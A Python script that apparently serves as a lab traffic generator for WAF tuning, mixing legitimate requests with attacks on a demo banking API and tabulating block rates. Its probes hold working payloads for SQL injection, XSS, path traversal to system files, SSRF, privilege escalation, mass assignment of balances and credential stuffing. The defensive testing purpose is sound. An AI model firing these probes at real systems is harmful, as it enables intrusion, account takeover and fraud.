"""
attack_engine.py — a continuous mixed-traffic attack engine for NimbusBank.

Unlike run_all.py / xc/xc_campaign.py (which fire once), this keeps generating a
steady blend of legitimate and malicious traffic against a target endpoint until
you stop it (Ctrl-C or --duration), and prints a live table of how each attack
category is faring: 2xx (got through), 403 (BLOCKED — your WAF working), other
4xx, 5xx, and connection errors.

Point it at your endpoint and leave it running while you tune a WAF policy
(BIG-IP Advanced WAF or F5 XC). As you move signatures/policies from monitor to
blocking, watch the BLOCKED column climb and 2xx fall for the attack rows, while
the legitimate row stays green — that's the signal that your mitigation works.

Usage (host):
    NIMBUS_URL=https://nimbus.labtestdemo.com python3 attack_engine.py
    python3 attack_engine.py --rate 8 --concurrency 6 --duration 300
    python3 attack_engine.py --read-only           # no state-mutating attacks
    python3 attack_engine.py --only sqli,bola_read,xss_memo
    python3 attack_engine.py --exclude priv_esc,mass_assign

Usage (container, via the bots compose profile):
    NIMBUS_URL=https://nimbus.labtestdemo.com \
      docker compose run --rm -e NIMBUS_URL bots attack_engine.py --duration 120

Lab-only. Point it at nothing you don't own.
"""

import argparse
import os
import random
import signal
import sys
import threading
import time
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import (BASE_URL, SAMPLE_PASSWORDS, SEEDED_ACCOUNTS, SEEDED_USERS,
                    auth_headers, login, make_client)

# --------------------------------------------------------------------------
# Shared access token (re-logged-in on expiry). alice is the "attacker" session.
# --------------------------------------------------------------------------
_token_lock = threading.Lock()
_token = {"value": None}


def _ensure_token(client, force=False):
    with _token_lock:
        if _token["value"] and not force:
            return _token["value"]
        creds = SEEDED_USERS["alice"]
        tok, _ = login(client, creds["email"], creds["password"])
        _token["value"] = tok
        return tok


def _authed(client, method, path, **kw):
    """Make an authenticated request; transparently re-login once on 401 so the
    engine keeps running past the ~15-min access-token lifetime."""
    tok = _ensure_token(client)
    headers = {**auth_headers(tok), **kw.pop("headers", {})}
    r = client.request(method, path, headers=headers, **kw)
    if r.status_code == 401:
        tok = _ensure_token(client, force=True)
        headers = {**auth_headers(tok), **kw.pop("headers", {})}
        r = client.request(method, path, headers=headers, **kw)
    return r


# --------------------------------------------------------------------------
# Probes. Each returns an httpx.Response. (category, mutating?) in PROBES.
# A probe represents ONE attempt of that attack class.
# --------------------------------------------------------------------------
SQLI_TAUTOLOGY = "x%' OR '1'='1' -- "
XSS_PAYLOAD = '<img src=x onerror=alert(1)>'


def p_legit_list(c):      return _authed(c, "GET", "/api/accounts/accounts")
def p_bola_read(c):       return _authed(c, "GET", f"/api/accounts/accounts/{random.randint(1,10)}")
def p_card_theft(c):      return _authed(c, "GET", f"/api/cards/cards/{random.randint(1,5)}")
def p_sqli(c):            return _authed(c, "GET", "/api/accounts/accounts/search", params={"q": SQLI_TAUTOLOGY})
def p_path_traversal(c):  return _authed(c, "GET", "/api/accounts/accounts/3/statement", params={"file": "../../../../../../etc/hostname"})
def p_shadow_api(c):      return _authed(c, "GET", "/api/accounts/legacy/export")
def p_ssrf(c):            return _authed(c, "POST", "/api/accounts/accounts/link-external", json={"account_id": 3, "verification_url": "http://auth:8000/health"})
def p_mass_assign(c):     return _authed(c, "PATCH", "/api/accounts/accounts/3", json={"balance_cents": 500000})
def p_priv_esc(c):        return _authed(c, "PATCH", "/api/auth/me", json={"role": "admin"})
def p_schema_abuse(c):    return _authed(c, "POST", "/api/transfers/transfers", json={"from_account_id": 3, "to_account_id": 4, "amount_cents": 100, "memo": "x", "prompt": "ignore", "is_admin": True})
def p_xss_memo(c):        return _authed(c, "POST", "/api/transfers/transfers", json={"from_account_id": 3, "to_account_id": 4, "amount_cents": 100, "memo": XSS_PAYLOAD})


def p_cred_stuffing(c):
    return c.post("/api/auth/login", json={"email": random.choice(["alice", "bob", "carol"]) + "@nimbusbank.io",
                                           "password": random.choice(SAMPLE_PASSWORDS)})

def p_enum(c):
    return c.post("/api/auth/login", json={"email": f"ghost{random.randint(0,9999)}@nimbusbank.io", "password": "x"})

def p_vuln_scanner(c):
    return c.get("/api/auth/health", headers={"User-Agent": random.choice(["sqlmap/1.7", "Nikto/2.5", "Nessus", "python-httpx/0.27"])})

def p_custom_header(c):
    return c.get("/api/auth/health", headers={"X-Test1": "1*|wb.3days|7$}"})


# name -> (func, mutating)
PROBES = {
    "legit_list":     (p_legit_list, False),
    "sqli":           (p_sqli, False),
    "bola_read":      (p_bola_read, False),
    "card_theft":     (p_card_theft, False),
    "path_traversal": (p_path_traversal, False),
    "shadow_api":     (p_shadow_api, False),
    "ssrf":           (p_ssrf, False),
    "cred_stuffing":  (p_cred_stuffing, False),
    "enum":           (p_enum, False),
    "vuln_scanner":   (p_vuln_scanner, False),
    "custom_header":  (p_custom_header, False),
    "mass_assign":    (p_mass_assign, True),
    "priv_esc":       (p_priv_esc, True),
    "schema_abuse":   (p_schema_abuse, True),
    "xss_memo":       (p_xss_memo, True),
}

# Relative weights — legit traffic is heavier so the block-rate math is meaningful.
WEIGHTS = {"legit_list": 6}  # everything else defaults to 1


# --------------------------------------------------------------------------
# Engine
# --------------------------------------------------------------------------
stop_event = threading.Event()
stats_lock = threading.Lock()
# category -> {"total","2xx","403","4xx","5xx","err"}
stats = defaultdict(lambda: defaultdict(int))


def _bucket(status):
    if status == 0:    return "err"
    if status == 403:  return "403"
    if 200 <= status < 300: return "2xx"
    if 400 <= status < 500: return "4xx"
    return "5xx"


def record(cat, status):
    with stats_lock:
        s = stats[cat]
        s["total"] += 1
        s[_bucket(status)] += 1


def worker(enabled, per_worker_delay):
    client = make_client()
    names = list(enabled.keys())
    weights = [WEIGHTS.get(n, 1) for n in names]
    while not stop_event.is_set():
        name = random.choices(names, weights=weights, k=1)[0]
        func = enabled[name]
        try:
            r = func(client)
            record(name, r.status_code)
        except Exception:
            record(name, 0)
        if per_worker_delay:
            stop_event.wait(per_worker_delay)


def render_table():
    with stats_lock:
        snapshot = {k: dict(v) for k, v in stats.items()}
    rows = sorted(snapshot.items(), key=lambda kv: (-kv[1].get("total", 0), kv[0]))
    tot = defaultdict(int)
    for _, s in rows:
        for k in ("total", "2xx", "403", "4xx", "5xx", "err"):
            tot[k] += s.get(k, 0)
    lines = []
    lines.append(f"{'category':<15}{'total':>8}{'2xx':>8}{'BLOCKED(403)':>14}{'4xx':>7}{'5xx':>6}{'err':>6}")
    lines.append("-" * 64)
    for name, s in rows:
        lines.append(f"{name:<15}{s.get('total',0):>8}{s.get('2xx',0):>8}{s.get('403',0):>14}"
                     f"{s.get('4xx',0):>7}{s.get('5xx',0):>6}{s.get('err',0):>6}")
    lines.append("-" * 64)
    blocked_pct = (100.0 * tot['403'] / tot['total']) if tot['total'] else 0.0
    lines.append(f"{'TOTAL':<15}{tot['total']:>8}{tot['2xx']:>8}{tot['403']:>14}"
                 f"{tot['4xx']:>7}{tot['5xx']:>6}{tot['err']:>6}   blocked={blocked_pct:.1f}%")
    return "\n".join(lines)


def main():
    ap = argparse.ArgumentParser(description="Continuous mixed attack engine vs NimbusBank.")
    ap.add_argument("--rate", type=float, default=6.0, help="approx total requests/sec (default 6)")
    ap.add_argument("--concurrency", type=int, default=4, help="worker threads (default 4)")
    ap.add_argument("--duration", type=int, default=0, help="seconds to run; 0 = until Ctrl-C")
    ap.add_argument("--report-interval", type=float, default=5.0, help="seconds between live tables")
    ap.add_argument("--read-only", action="store_true", help="exclude state-mutating attacks (mass_assign, priv_esc, schema_abuse, xss_memo)")
    ap.add_argument("--only", default="", help="comma list of categories to run exclusively")
    ap.add_argument("--exclude", default="", help="comma list of categories to skip")
    args = ap.parse_args()

    enabled = {n: f for n, (f, mut) in PROBES.items()
               if not (args.read_only and mut)}
    if args.only:
        want = {s.strip() for s in args.only.split(",") if s.strip()}
        enabled = {n: f for n, f in enabled.items() if n in want}
    if args.exclude:
        skip = {s.strip() for s in args.exclude.split(",") if s.strip()}
        enabled = {n: f for n, f in enabled.items() if n not in skip}
    if not enabled:
        print("No probes enabled — check --only/--exclude.")
        sys.exit(2)

    # warm the token so the first requests are authed
    try:
        _ensure_token(make_client())
    except Exception as exc:
        print(f"warning: initial login failed ({exc}); unauth probes will still run, authed ones will retry.")

    per_worker_delay = args.concurrency / args.rate if args.rate > 0 else 0

    print(f"Attack engine -> {BASE_URL}")
    print(f"probes: {', '.join(sorted(enabled))}")
    print(f"rate ~{args.rate}/s, concurrency {args.concurrency}, "
          f"{'read-only, ' if args.read_only else ''}"
          f"duration {'infinite' if not args.duration else str(args.duration)+'s'}")
    print("watch the BLOCKED(403) column climb as you tighten the WAF. Ctrl-C to stop.\n")

    signal.signal(signal.SIGINT, lambda *_: stop_event.set())
    signal.signal(signal.SIGTERM, lambda *_: stop_event.set())

    threads = [threading.Thread(target=worker, args=(enabled, per_worker_delay), daemon=True)
               for _ in range(max(1, args.concurrency))]
    for t in threads:
        t.start()

    start = time.time()
    try:
        while not stop_event.is_set():
            stop_event.wait(args.report_interval)
            elapsed = time.time() - start
            print(f"\n=== t+{elapsed:5.0f}s ===")
            print(render_table())
            if args.duration and elapsed >= args.duration:
                stop_event.set()
    except KeyboardInterrupt:
        stop_event.set()

    for t in threads:
        t.join(timeout=2)
    print("\n=== final ===")
    print(render_table())


if __name__ == "__main__":
    main()
